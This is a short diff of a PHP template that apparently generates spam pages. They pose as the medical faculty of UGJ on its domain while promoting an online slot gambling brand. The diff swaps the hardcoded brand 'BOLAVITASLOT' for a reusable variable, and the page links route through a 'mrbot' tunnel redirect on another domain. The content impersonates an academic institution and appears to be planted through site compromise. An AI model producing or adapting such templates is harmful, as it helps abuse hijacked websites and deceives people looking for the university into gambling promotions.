@@ -8,7 +8,7 @@ $baseImages = "https://nerlamina.sirv.com/image-bvs/3linkbvs.jpg";
 $baseURL = "https://fkunswagati.ac.id/?$tunnel=".str_replace(" ","%20",$bigBrand);
 $ampURL = "https://link.akunspesial.vip/mrbot/tunnel/fkunswagati/?mrbot=".str_replace(" ","%20",$bigBrand);
 $baseTitle = "$bigBrand 🛩️ Fakultas Kedokteran UGJ Terbaru";
-$baseDesc = "$bigBrand hadir sebagai pilihan terbaik buat kamu yang ingin jadi dokter profesional. Dengan kurikulum modern dan fasilitas lengkap, BOLAVITASLOT siap mencetak tenaga medis berkualitas. Dosen berpengalaman bakal membimbing kamu dengan metode pembelajaran interaktif yang bikin makin paham.";
+$baseDesc = "$bigBrand hadir sebagai pilihan terbaik buat kamu yang ingin jadi dokter profesional. Dengan kurikulum modern dan fasilitas lengkap, $bigBrand siap mencetak tenaga medis berkualitas. Dosen berpengalaman bakal membimbing kamu dengan metode pembelajaran interaktif yang bikin makin paham.";
 $baseRefURL = "https://link.akunspesial.vip/mrbot/tunnel/fkunswagati/?mrbot=".str_replace(" ","%20",$bigBrand);
 
 ?>
